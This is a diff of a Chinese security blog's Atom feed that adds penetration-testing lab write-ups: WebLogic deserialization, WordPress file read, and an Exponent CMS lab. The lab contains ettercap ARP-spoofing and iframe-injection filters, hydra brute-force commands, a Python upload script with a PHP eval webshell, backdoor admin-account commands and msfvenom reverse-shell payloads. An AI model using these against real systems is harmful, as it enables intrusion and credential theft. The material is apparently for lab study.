@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://prontosil.com/"/>
-  <updated>2020-03-10T07:19:48.026Z</updated>
+  <updated>2020-03-10T08:03:55.080Z</updated>
   <id>http://prontosil.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>企业环境渗透2</title>
+    <link href="http://prontosil.com/posts/c08799e1/"/>
+    <id>http://prontosil.com/posts/c08799e1/</id>
+    <published>2020-03-10T07:47:54.000Z</published>
+    <updated>2020-03-10T08:03:55.080Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="任务一-weblogic反序列化"><a href="#任务一-weblogic反序列化" class="headerlink" title="任务一 weblogic反序列化"></a>任务一 weblogic反序列化</h2><p>weblogic介绍</p><p>浏览器访问192.168.2.10:7001 然后就404</p><p><img src="/posts/c08799e1/1583826737126.png" alt></p><p>使用工具包中的webloigc利用工具</p><p><img src="/posts/c08799e1/1583826784567.png" alt></p><p>看到flag了是不是，然后执行 <code>cat /home/flag</code> 是吧233333</p><p>其实，这个flag不过就是个目录。。</p><p><img src="/posts/c08799e1/1583826861077.png" alt></p><p>得到flag</p><p><img src="/posts/c08799e1/1583826902355.png" alt="1583826902355"></p><h2 id="任务二-Wrodpress-任意文件读取"><a href="#任务二-Wrodpress-任意文件读取" class="headerlink" title="任务二 Wrodpress 任意文件读取"></a>任务二 Wrodpress 任意文件读取</h2><p>wpscan常规扫描一下</p><p><img src="/posts/c08799e1/1583826949884.png" alt></p><p>存在一个任意文件读取漏洞(不能复制粘贴好难受)</p><p><img src="/posts/c08799e1/1583826994083.png" alt></p><h2 id="任务三-Wordpress命令执行"><a href="#任务三-Wordpress命令执行" class="headerlink" title="任务三 Wordpress命令执行"></a>任务三 Wordpress命令执行</h2><h2 id="任务四-改进漏洞利用脚本获得命令执行权限"><a href="#任务四-改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四 改进漏洞利用脚本获得命令执行权限"></a>任务四 改进漏洞利用脚本获得命令执行权限</h2>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;任务一-weblogic反序列化&quot;&gt;&lt;a href=&quot;#任务一-weblogic反序列化&quot; class=&quot;headerlink&quot; title=&quot;任务一 weblogic反序列化&quot;&gt;&lt;/a&gt;任务一 weblogic反序列化&lt;/h2&gt;&lt;p&gt;weblogic介绍&lt;/p&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>命令执行绕过技巧</title>
@@ -323,15 +349,17 @@
     <link href="http://prontosil.com/posts/ea51772/"/>
     <id>http://prontosil.com/posts/ea51772/</id>
     <published>2020-03-05T06:55:44.000Z</published>
-    <updated>2020-03-06T04:41:52.801Z</updated>
+    <updated>2020-03-10T08:37:02.524Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="任务一-使用nmap-ettercap进行网络侦查和密码嗅探"><a href="#任务一-使用nmap-ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务一  使用nmap,ettercap进行网络侦查和密码嗅探"></a>任务一  使用nmap,ettercap进行网络侦查和密码嗅探</h2><p>ettercap使用</p><p>常用参数</p><ul><li>-l 显示可用网卡</li><li>-i 选择网卡</li><li>-t 协议选择，tcp/udp/all</li><li>-p 不进行毒化攻击，只用来嗅探</li><li>-F 载入过滤器文件</li><li>-V text 将数据包以文本形式显示在屏幕上</li></ul><p><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</p><p>具体到这个实验，需要使用ettercap去捕获ftp登陆的用户名和口令。其中，192.168.1.3 开放了ftp端口，所以尝试多次之后</p><pre><code>ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</code></pre><p><img src="/posts/ea51772/Image.png" alt></p><p>然后就抓到密码了</p><p><img src="/posts/ea51772/Image-1583392370959.png" alt></p><p>ettercap过滤脚本：</p><pre><code> if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.dst == 80 || tcp.dst == 8080) {      #...and if it contains an Accept-Encoding header...      if (search(DATA.data, &quot;Accept-Encoding&quot;)) {      #...remove any Encoding (make sure we are using plain text)      replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing!&quot;);        }    }    #--Inject Iframe--    if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.src == 80 || tcp.src == 8080) {       if (search(DATA.data, &quot;&lt;body&gt;&quot;)){           #Replace it with the body tag and an iframe to our attacking webpage           replace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&lt;iframe src=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;body&gt;\n&quot;);       }       if (search(DATA.data, &quot;&lt;BODY&gt;&quot;)){           replace(&quot;&lt;BODY&gt;&quot;,&quot;&lt;BODY&gt;&lt;IFRAME SRC=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;BODY&gt;\n&quot;);       }   }</code></pre><p>第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。</BODY></body></p><p>基本语法</p><pre><code>Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。编译过滤规则的命令是：etterfilter filter.ecf -o filter.ef。即把filter.ecf文件编译成ettercap能识别的filter.ef文件。过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号{}不能省略。Ettercap提供的一些常用的函数有：search(where, what) 从字符串where中查找what，若找到则返回trueregex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回truereplace(what, with) 把字符串what替换成字符串withlog(what, where) 把字符串what记录到where文件中msg(message) 在屏幕上显示出字符串messageexit() 退出</code></pre><p>（当然这里不用这么复杂啦</p><h2 id="任务二-使用crunch，hydra暴力破解ssh服务"><a href="#任务二-使用crunch，hydra暴力破解ssh服务" class="headerlink" title="任务二 使用crunch，hydra暴力破解ssh服务"></a>任务二 使用crunch，hydra暴力破解ssh服务</h2><p>crunch的基本用法</p><p>*　　-b #体积大小，比如后跟20mib<br>*　　-c #密码个数（行数），比如8000<br>*　　-d #限制出现相同元素的个数（即至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的<br>*　　-e #定义停止生成密码 ，比如-e 222222：到222222停止生成密码<br>*　　-f #调用密码库文件，比如/usr/share/crunch/charset.lst<br>*　　-i #改变输出格式<br>*　　-l #与-t搭配使用<br>*　　-m #与-p搭配使用<br>*　　-o #保存为<br>*　　-p #定义密码元素<br>*　　-q #读取字典<br>*　　-r #定义从某一个地方重新开始<br>*　　-s #第一个密码，从xxx开始<br>*　　-t #定义输出格式</p><p>hydra爆破的用法</p><ul><li>破解ssh</li></ul><p><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</code></p><ul><li>破解ftp</li></ul><p><code>hydra ip ftp -l 用户名 -P 密码字典 -t线程(默认16) -vV</code></p><ul><li>破解rdp</li></ul><p><code>hydra ip rdp -l administrator -P pass.txt -V</code></p><ul><li>破解telnet</li></ul><p><code>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</code></p><p>当然这里我们直接社工吧。。hacker123</p><h2 id="任务三-使用ssh登陆"><a href="#任务三-使用ssh登陆" class="headerlink" title="任务三 使用ssh登陆"></a>任务三 使用ssh登陆</h2><p>不说了。。</p><h2 id="任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息</h2>]]></content>
+    <content type="html"><![CDATA[<p>实验的网络拓扑结构：kali是攻击机，另外两台是靶机</p><p><img src="/posts/ea51772/1583827591679.png" alt></p><p><img src="/posts/ea51772/1583827763195.png" alt></p><h2 id="任务一-使用nmap-ettercap进行网络侦查和密码嗅探"><a href="#任务一-使用nmap-ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务一  使用nmap,ettercap进行网络侦查和密码嗅探"></a>任务一  使用nmap,ettercap进行网络侦查和密码嗅探</h2><p>ettercap使用</p><p>常用参数</p><ul><li>-l 显示可用网卡</li><li>-i 选择网卡</li><li>-t 协议选择，tcp/udp/all</li><li>-p 不进行毒化攻击，只用来嗅探</li><li>-F 载入过滤器文件</li><li>-V text 将数据包以文本形式显示在屏幕上</li></ul><p><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</p><p>具体到这个实验，需要使用ettercap去捕获ftp登陆的用户名和口令。其中，192.168.1.3 开放了ftp端口，所以尝试多次之后</p><pre><code>ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</code></pre><p><img src="/posts/ea51772/Image.png" alt></p><p>然后就抓到密码了</p><p><img src="/posts/ea51772/Image-1583392370959.png" alt></p><p>ettercap过滤脚本学习：</p><pre><code> if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.dst == 80 || tcp.dst == 8080) {      #...and if it contains an Accept-Encoding header...      if (search(DATA.data, &quot;Accept-Encoding&quot;)) {      #...remove any Encoding (make sure we are using plain text)      replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing!&quot;);        }    }    #--Inject Iframe--    if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.src == 80 || tcp.src == 8080) {       if (search(DATA.data, &quot;&lt;body&gt;&quot;)){           #Replace it with the body tag and an iframe to our attacking webpage           replace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&lt;iframe src=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;body&gt;\n&quot;);       }       if (search(DATA.data, &quot;&lt;BODY&gt;&quot;)){           replace(&quot;&lt;BODY&gt;&quot;,&quot;&lt;BODY&gt;&lt;IFRAME SRC=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;BODY&gt;\n&quot;);       }   }</code></pre><p>第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。</BODY></body></p><p>基本语法</p><pre><code>Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。编译过滤规则的命令是：etterfilter filter.ecf -o filter.ef。即把filter.ecf文件编译成ettercap能识别的filter.ef文件。过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号{}不能省略。Ettercap提供的一些常用的函数有：search(where, what) 从字符串where中查找what，若找到则返回trueregex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回truereplace(what, with) 把字符串what替换成字符串withlog(what, where) 把字符串what记录到where文件中msg(message) 在屏幕上显示出字符串messageexit() 退出</code></pre><p>（当然这里不用这么复杂啦</p><h2 id="任务二-使用crunch，hydra暴力破解ssh服务"><a href="#任务二-使用crunch，hydra暴力破解ssh服务" class="headerlink" title="任务二 使用crunch，hydra暴力破解ssh服务"></a>任务二 使用crunch，hydra暴力破解ssh服务</h2><p>crunch的基本用法</p><p>*　　-b #体积大小，比如后跟20mib<br>*　　-c #密码个数（行数），比如8000<br>*　　-d #限制出现相同元素的个数（即至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的<br>*　　-e #定义停止生成密码 ，比如-e 222222：到222222停止生成密码<br>*　　-f #调用密码库文件，比如/usr/share/crunch/charset.lst<br>*　　-i #改变输出格式<br>*　　-l #与-t搭配使用<br>*　　-m #与-p搭配使用<br>*　　-o #保存为<br>*　　-p #定义密码元素<br>*　　-q #读取字典<br>*　　-r #定义从某一个地方重新开始<br>*　　-s #第一个密码，从xxx开始<br>*　　-t #定义输出格式</p><p>hydra爆破的用法</p><ul><li>破解ssh</li></ul><p><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</code></p><ul><li>破解ftp</li></ul><p><code>hydra ip ftp -l 用户名 -P 密码字典 -t线程(默认16) -vV</code></p><ul><li>破解rdp</li></ul><p><code>hydra ip rdp -l administrator -P pass.txt -V</code></p><ul><li>破解telnet</li></ul><p><code>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</code></p><p>当然这里我们直接社工吧。。hacker123</p><h2 id="任务三-使用ssh登陆"><a href="#任务三-使用ssh登陆" class="headerlink" title="任务三 使用ssh登陆"></a>任务三 使用ssh登陆</h2><p>不说了。。ssh命令了解一下即可</p><h2 id="任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息</h2><p>这是exponent cms的漏洞，百度就知道了</p><p><a href="https://www.anquanke.com/post/id/84514" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84514</a></p><p>简单来说就是对上传没做过滤可以任意文件上传，但是上传之后就会被删掉</p><p>(看上去挺安全的，其实23333，引狼入室犯了安全大忌)</p><p>在判断的时候，可以通过修改参数来实现绕过删除</p><p>绕过删除之后，由于文件被重命名了，所以需要爆破一下文件名，使用脚本能够比较方便的完成</p><pre><code class="python">import requestsbase_url=&#39;http://192.168.1.4/&#39;url_for_time=&#39;index.php?module=eventregistration&amp;action=eventsCalendar&#39;url_for_upload=&#39;index.php?module=eventregistration&amp;action=emailRegistrants&amp;email_addresses=123456789@123.com&amp;email_message=1&amp;email_subject=1&#39;files={&#39;attach&#39;:open(&#39;index.php&#39;,&#39;rb&#39;)}requests.post(base_url+url_for_upload,files=files)print &#39;upload finish&#39;r=requests.get(base_url+url_for_time)html1=r.content#print html1index=r.content.find(&#39;History.pushState&#39;)if index:    time=html1[index:index+60].split(&#39;rel&#39;)[1].split(&#39;\&#39;&#39;)[1]else:    print &#39;something wrong&#39;    exit(0)print &quot;get time:&quot;+ timefor i in range(int(time),int(time)-20,-1):    shell_url=base_url+&#39;tmp/&#39;+str(i)+&#39;_index.php&#39;    r2=requests.get(shell_url)    if r2.status_code==200:        print &quot;shell is here : &quot;+shell_url </code></pre><p>准备一个index.php</p><pre><code class="php">root@simpleedu:~# cat index.php&lt;?phpeval($_REQUEST[cmd]);phpinfo();?&gt;</code></pre><p>(为了验证上传成功，多加个phpinfo())</p><p>自动上传，爆破得到文件名</p><p><img src="/posts/ea51772/1583828526162.png" alt></p><p>然后就是添加用户，将用户添加到用户组</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>看一下端口开放情况</p><p><img src="/posts/ea51772/1583828518473.png" alt></p><p>这里。。比较坑的就是远程桌面并不是3389，而是。。。35155</p><pre><code>rdesktop 192.168.1.4:35155</code></pre><p>连接之后即可，发现 <code>2.key</code> 文件，给它添加一个用户即可</p><p><img src="/posts/ea51772/1583828819591.png" alt></p><p>太卡了就不演示了</p><h2 id="ps-使用metasploit做法"><a href="#ps-使用metasploit做法" class="headerlink" title="ps 使用metasploit做法"></a>ps 使用metasploit做法</h2><p>一开始由于找不到图形界面，所以只能用命令行去刚。最后还是屈服了(GUI真香)</p><p>msfvenom生成php马</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw  -o index.php</code></pre><p><img src="/posts/ea51772/1583829091269.png" alt="成功弹到shell"></p><p>然而美中不足的是权限不够，所以需要再生成一个Windows的木马反弹一次。。</p><p>重新开始监听，换一个payload</p><p><img src="/posts/ea51772/1583829313717.png" alt></p><p>msfvenom 生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>传一下shell.exe</p><p><img src="/posts/ea51772/1583829335497.png" alt="1583829335497"></p><p>执行，成功反弹</p><p><img src="/posts/ea51772/1583829371796.png" alt></p><p>当然这样也能获得管理员权限，但是还是没法读文件</p><p><img src="/posts/ea51772/1583829406417.png" alt></p><p>也就是记录一下msf的强大</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h2 id=&quot;任务一-使用nmap-ettercap进行网络侦查和密码嗅探&quot;&gt;&lt;a href=&quot;#任务一-使用nmap-ettercap进行网络侦查和密码嗅探&quot; class=&quot;headerlink&quot; title=&quot;任务一  使用nmap,ettercap进行网络侦查和密码嗅探&quot;
+        &lt;p&gt;实验的网络拓扑结构：kali是攻击机，另外两台是靶机&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/ea51772/1583827591679.png&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/ea51772/1583827763195.png&quot; alt
       
     
     </summary>
@@ -487,21 +515,6 @@
       <category term="HTB" scheme="http://prontosil.com/tags/HTB/"/>
     
       <category term="靶机" scheme="http://prontosil.com/tags/%E9%9D%B6%E6%9C%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>每天一道leetcode-最长回文字串</title>
-    <link href="http://prontosil.com/posts/a99288c/"/>
-    <id>http://prontosil.com/posts/a99288c/</id>
-    <published>2020-02-10T14:26:19.000Z</published>
-    <updated>2020-02-29T09:16:50.199Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
     
   </entry>
   
